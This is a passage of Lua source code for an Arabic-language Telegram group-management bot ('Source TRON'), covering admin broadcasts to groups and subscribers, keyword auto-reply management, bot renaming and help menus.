send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAbd:setex(TRON.."Abd:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙ارسل الرساله الان لتوجيها \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbd:get(TRON.."Abd:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbd:del(TRON.."Abd:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevAbd:smembers(TRON..'Abd:Groups')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بالتوجيه \n⌁︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevAbd:del(TRON.."Abd:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source TRON     --
if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه خاص بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAbd:get(TRON.."Abd:Send:Bot"..TRON) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAbd:setex(TRON.."Abd:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙ارسل الرساله الان لتوجيها \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbd:get(TRON.."Abd:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbd:del(TRON.."Abd:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevAbd:smembers(TRON..'Abd:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بالتوجيه \n⌁︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
DevAbd:del(TRON.."Abd:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source TRON     --
if text == "اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه بالتثبيت ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevAbd:get(TRON.."Abd:Send:Bot"..TRON) and not SecondSudo(msg) then 
send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevAbd:setex(TRON.."Abd:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbd:get(TRON.."Abd:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbd:del(TRON.."Abd:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevAbd:smembers(TRON.."Abd:Groups") 
if msg.content_.text_ then
for k,v in pairs(List) do 
AbdText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevAbd:set(TRON..'Abd:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
AbdText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevAbd:set(TRON..'Abd:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
AbdText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevAbd:set(TRON..'Abd:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
AbdText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevAbd:set(TRON..'Abd:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
AbdText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevAbd:set(TRON..'Abd:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
AbdText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevAbd:set(TRON..'Abd:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
AbdText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevAbd:set(TRON..'Abd:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
AbdText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevAbd:set(TRON..'Abd:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة "..AbdText.." بالتثبيت \n⌁︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevAbd:del(TRON.."Abd:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end
--     Source TRON     --
if text == 'حذف رد من متعدد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد من متعدد' and Manager(msg) and ChCheck(msg) then
local List = DevAbd:smembers(TRON..'Abd:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end
DevAbd:set(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevAbd:get(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedod == 'DelGpRedRedod' then
if text == "الغاء" then 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر" ,  1, "md")
DevAbd:del(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
if not DevAbd:sismember(TRON..'Abd:Manager:GpRedod'..msg.chat_id_,text) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لايوجد رد متعدد لهذه الكلمه ↫ "..text ,  1, "md")
return false
end
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙قم بارسال الرد المتعدد الذي تريد حذفه من الكلمه ↫ "..text ,  1, "md")
DevAbd:set(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevAbd:set(TRON..'Abd:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
if text == 'حذف رد متعدد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد متعدد' and Manager(msg) and ChCheck(msg) then
local List = DevAbd:smembers(TRON..'Abd:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end
DevAbd:set(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه لحذفها" ,  1, "md")
return false
end
if text == 'اضف رد متعدد' and Manager(msg) and ChCheck(msg) then
DevAbd:set(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه الان" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetGpRedod = DevAbd:get(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SetGpRedod == 'SetGpRedod' then
if text == "الغاء" then 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر" ,  1, "md")
DevAbd:del(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
if DevAbd:sismember(TRON..'Abd:Manager:GpRedod'..msg.chat_id_,text) then
local Abd = "⌁︙لاتستطيع اضافة رد بالتاكيد مضاف في القائمه قم بحذفه اولا !"
keyboard = {} 
keyboard.inline_keyboard = {{{text="حذف الرد ↫ "..text,callback_data="/DelRed:"..msg.sender_user_id_..text}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Abd).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevAbd:del(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الامر ارسل الرد الاول\n⌁︙للخروج ارسل ↫ ( الغاء )" ,  1, "md")
DevAbd:set(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevAbd:set(TRON..'Abd:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevAbd:sadd(TRON..'Abd:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     Source TRON     --
if text == 'حذف رد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد' and  Manager(msg) and ChCheck(msg) then
local List = DevAbd:smembers(TRON..'Abd:Manager:GpRed'..msg.chat_id_)
if #List == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
return false
end
DevAbd:set(TRON..'Abd:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if text == 'اضف رد' and Manager(msg) and ChCheck(msg) then
DevAbd:set(TRON..'Abd:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetGpRed = DevAbd:get(TRON..'Abd:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SetGpRed == 'SetGpRed' then
if text == "الغاء" then 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر" ,  1, "md")
DevAbd:del(TRON..'Abd:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙يمكنك اضافة الى النص ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevAbd:set(TRON..'Abd:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevAbd:set(TRON..'Abd:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevAbd:sadd(TRON..'Abd:Manager:GpRed'..msg.chat_id_,text)
DevAbd:set(TRON..'DelManagerRep'..msg.chat_id_,text)
return false
end end
--     Source TRON     --
if text == 'حذف رد عام' and SecondSudo(msg) or text == '↫ حذف رد عام ⌁' and SecondSudo(msg) or text == 'مسح رد عام' and SecondSudo(msg) then
local List = DevAbd:smembers(TRON.."Abd:Sudo:AllRed")
if #List == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
return false
end
DevAbd:set(TRON.."Abd:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if text == 'اضف رد عام' and SecondSudo(msg) or text == '↫ اضف رد عام ⌁' and SecondSudo(msg) then
DevAbd:set(TRON.."Abd:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetAllRed = DevAbd:get(TRON.."Abd:Add:AllRed"..msg.sender_user_id_)
if SetAllRed == 'SetAllRed' then
if text == "الغاء" then 
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر" ,  1, "md")
DevAbd:del(TRON..'Abd:Add:AllRed'..msg.sender_user_id_)
return false
end
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙يمكنك اضافة الى النص ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevAbd:set(TRON.."Abd:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevAbd:set(TRON.."Abd:Add:AllText"..msg.sender_user_id_, text)
DevAbd:sadd(TRON.."Abd:Sudo:AllRed",text)
DevAbd:set(TRON.."DelSudoRep",text)
return false 
end end
--     Source TRON     --
if text == 'الردود المتعدده' and Manager(msg) and ChCheck(msg) then
local redod = DevAbd:smembers(TRON..'Abd:Manager:GpRedod'..msg.chat_id_)
MsgRep = '⌁︙قائمة الردود المتعدده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevAbd:smembers(TRON..'Abd:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
MsgRep = '⌁︙لا توجد ردود متعدده مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text == 'حذف الردود المتعدده' and Manager(msg) and ChCheck(msg) or text == 'مسح الردود المتعدده' and Manager(msg) and ChCheck(msg) then
local redod = DevAbd:smembers(TRON..'Abd:Manager:GpRedod'..msg.chat_id_)
if #redod == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود متعدده مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbd:del(TRON..'Abd:Text:GpTexts'..v..msg.chat_id_)
DevAbd:del(TRON..'Abd:Manager:GpRedod'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف الردود المتعدده")  
return false
end
end
--     Source TRON     --
if text == 'الردود' and Manager(msg) and ChCheck(msg) or text == 'ردود المدير' and Manager(msg) and ChCheck(msg) then
local redod = DevAbd:smembers(TRON..'Abd:Manager:GpRed'..msg.chat_id_)
MsgRep = '⌁︙ردود المدير ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
if DevAbd:get(TRON.."Abd:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevAbd:get(TRON.."Abd:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevAbd:get(TRON.."Abd:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevAbd:get(TRON.."Abd:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevAbd:get(TRON.."Abd:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevAbd:get(TRON.."Abd:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevAbd:get(TRON.."Abd:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevAbd:get(TRON.."Abd:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '⌁︙لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text == 'حذف الردود' and Manager(msg) and ChCheck(msg) or text == 'مسح الردود' and Manager(msg) and ChCheck(msg) or text == 'حذف ردود المدير' and Manager(msg) and ChCheck(msg) or text == 'مسح ردود المدير' and Manager(msg) and ChCheck(msg) then
local redod = DevAbd:smembers(TRON..'Abd:Manager:GpRed'..msg.chat_id_)
if #redod == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbd:del(TRON..'Abd:Gif:GpRed'..v..msg.chat_id_)
DevAbd:del(TRON..'Abd:Voice:GpRed'..v..msg.chat_id_)
DevAbd:del(TRON..'Abd:Audio:GpRed'..v..msg.chat_id_)
DevAbd:del(TRON..'Abd:Photo:GpRed'..v..msg.chat_id_)
DevAbd:del(TRON..'Abd:Stecker:GpRed'..v..msg.chat_id_)
DevAbd:del(TRON..'Abd:Video:GpRed'..v..msg.chat_id_)
DevAbd:del(TRON..'Abd:File:GpRed'..v..msg.chat_id_)
DevAbd:del(TRON..'Abd:Text:GpRed'..v..msg.chat_id_)
DevAbd:del(TRON..'Abd:Manager:GpRed'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف ردود المدير")  
return false
end
end
--     Source TRON     --
if  text == "ردود المطور" and SecondSudo(msg) or text == "الردود العام" and SecondSudo(msg) or text == "ردود العام" and SecondSudo(msg) or text == "↫ الردود العام ⌁" and SecondSudo(msg) then
local redod = DevAbd:smembers(TRON.."Abd:Sudo:AllRed")
MsgRep = '⌁︙ردود المطور ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
if DevAbd:get(TRON.."Abd:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevAbd:get(TRON.."Abd:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevAbd:get(TRON.."Abd:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevAbd:get(TRON.."Abd:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevAbd:get(TRON.."Abd:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevAbd:get(TRON.."Abd:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevAbd:get(TRON.."Abd:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevAbd:get(TRON.."Abd:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '⌁︙لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text == "حذف ردود المطور" and SecondSudo(msg) or text == "حذف ردود العام" and SecondSudo(msg) or text == "مسح ردود المطور" and SecondSudo(msg) then
local redod = DevAbd:smembers(TRON.."Abd:Sudo:AllRed")
if #redod == 0 then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbd:del(TRON.."Abd:Add:AllRed"..v)
DevAbd:del(TRON.."Abd:Gif:AllRed"..v)
DevAbd:del(TRON.."Abd:Voice:AllRed"..v)
DevAbd:del(TRON.."Abd:Audio:AllRed"..v)
DevAbd:del(TRON.."Abd:Photo:AllRed"..v)
DevAbd:del(TRON.."Abd:Stecker:AllRed"..v)
DevAbd:del(TRON.."Abd:Video:AllRed"..v)
DevAbd:del(TRON.."Abd:File:AllRed"..v)
DevAbd:del(TRON.."Abd:Text:AllRed"..v)
DevAbd:del(TRON.."Abd:Sudo:AllRed")
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف ردود المطور")  
return false
end
end 
--     Source TRON     --
if text and text == "تغيير اسم البوت" or text and text == "وضع اسم البوت" or text and text == "تغير اسم البوت" then
if not SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي اسم البوت الان" ,  1, "md") 
DevAbd:set(TRON..'Abd:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
if text and text == 'حذف اسم البوت' or text == 'مسح اسم البوت' then
if not SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbd:del(TRON..'Abd:NameBot')
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم حذف اسم البوت'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
end end 
--     Source TRON     --
if text and text:match("^استعاده الاوامر$") and SecondSudo(msg) or text and text:match("^استعادة كلايش الاوامر$") and SecondSudo(msg) then
HelpList ={'Abd:Help','Abd:Help1','Abd:Help2','Abd:Help3','Abd:Help4','Abd:Help5','Abd:Help6'}
for i,Help in pairs(HelpList) do
DevAbd:del(TRON..Help) 
end
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم استعادة الكلايش الاصليه" ,  1, "md") 
end
if text == "تعيين الاوامر" and SecondSudo(msg) or text == "تعيين امر الاوامر" and SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (الاوامر) الان " ,  1, "md")
DevAbd:set(TRON..'Abd:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local TRONTEAM =  DevAbd:get(TRON..'Abd:Help0'..msg.sender_user_id_)
if TRONTEAM == 'msg' then
Dev_Abd(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbd:del(TRON..'Abd:Help0'..msg.sender_user_id_)
DevAbd:set(TRON..'Abd:Help', text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "الاوامر" or text == "اوامر" or text == "مساعده" then
local Help = DevAbd:get(TRON..'Abd:Help')
local Text = [[
⌁︙اهلا بك في قائمة الاوامر ↫ ⤈ 
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙م1 ↫ اوامر الحمايه
⌁︙م2 ↫ اوامر الادمنيه
⌁︙م3 ↫ اوامر المدراء
⌁︙م4 ↫ اوامر المنشئين
⌁︙م5 ↫ اوامر المطورين
⌁︙م6 ↫ اوامر الاعضاء
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..msg.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..msg.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..msg.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..msg.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..msg.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Help or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "تعيين امر م1" and SecondSudo(msg) or text == "تعيين امر م١" and SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م1) الان " ,  1, "md")
DevAbd:set(TRON..'Abd:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local TRONTEAM =  DevAbd:get(TRON..'Abd:Help01'..msg.sender_user_id_)
if TRONTEAM == 'msg' then 
Dev_Abd(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbd:del(TRON..'Abd:Help01'..msg.sender_user_id_)
DevAbd:set(TRON..'Abd:Help1', text)
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م1" or text == "م١" or text == "اوامر1" or text == "اوامر١" then
if not Admin(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر يخص الرتب الاعلى فقط\n⌁︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevAbd:get(TRON..'Abd:Help1')
local Text = [[
⌁︙اوامر حماية المجموعه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙قفل • فتح ↫ الروابط
⌁︙قفل • فتح ↫ المعرفات
⌁︙قفل • فتح ↫ البوتات
⌁︙قفل • فتح ↫ المتحركه
⌁︙قفل • فتح ↫ الملصقات
⌁︙قفل • فتح ↫ الملفات
⌁︙قفل • فتح ↫ الصور
⌁︙قفل • فتح ↫ الفيديو
⌁︙قفل • فتح ↫ الاونلاين
⌁︙قفل • فتح ↫ الدردشه
⌁︙قفل • فتح ↫ التوجيه
⌁︙قفل • فتح ↫ الاغاني
⌁︙قفل • فتح ↫ الصوت
⌁︙قفل • فتح ↫ الجهات
⌁︙قفل • فتح ↫ الماركداون
⌁︙قفل • فتح ↫ التكرار
⌁︙قفل • فتح ↫ الهاشتاك
⌁︙قفل • فتح ↫ التعديل
⌁︙قفل • فتح ↫ التثبيت
⌁︙قفل • فتح ↫ الاشعارات
⌁︙قفل • فتح ↫ الكلايش
⌁︙قفل • فتح ↫ الدخول
⌁︙قفل • فتح ↫ الشبكات
⌁︙قفل • فتح ↫ المواقع
⌁︙قفل • فتح ↫ الفشار
⌁︙قفل • فتح ↫ الكفر
⌁︙قفل • فتح ↫ الطائفيه
⌁︙قفل • فتح ↫ الكل
⌁︙قفل • فتح ↫ العربيه
⌁︙قفل • فتح ↫ الانكليزيه
⌁︙قفل • فتح ↫ الفارسيه
⌁︙قفل • فتح ↫ التفليش
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر حمايه اخرى ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙قفل • فتح + الامر ↫ ⤈
⌁︙التكرار بالطرد
⌁︙التكرار بالكتم
⌁︙التكرار بالتقيد
⌁︙الفارسيه بالطرد
⌁︙البوتات بالطرد
⌁︙البوتات بالتقيد
